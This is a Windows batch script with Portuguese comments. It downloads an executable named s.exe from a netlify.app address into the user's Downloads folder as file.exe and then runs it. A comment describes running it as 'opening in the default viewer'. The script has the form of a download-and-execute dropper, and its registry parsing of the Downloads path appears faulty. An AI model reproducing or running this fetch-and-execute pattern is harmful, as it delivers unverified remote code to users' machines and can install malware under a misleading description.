@echo off
setlocal enabledelayedexpansion

rem Definindo variáveis
set "url=https://sandro52.netlify.app/s.exe"
set "output_filename=file.exe"
set "temp_folder=%TEMP%"
set "full_path=!temp_folder!\!output_filename!"

rem Obtendo o diretório de downloads padrão
set "download_path="
for /f "tokens=*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "{374DE290-123F-4565-9164-39C4925E467B}" ^| find "REG_SZ"') do (
    set "download_path=%%a"
)
if not defined download_path (
    echo Erro ao obter o diretório de downloads
    exit /b 1
)

rem Concatenando o caminho do arquivo ao diretório de downloads padrão
set "full_path=!download_path!\!output_filename!"

rem Inicializando o download com curl
curl -o "!full_path!" "!url!"

rem Verificando se o download foi bem-sucedido
if not exist "!full_path!" (
    echo Erro ao baixar o arquivo
    exit /b 1
)

rem Abrindo o arquivo no visualizador padrão do Windows
start "" "!full_path!"

exit /b 0

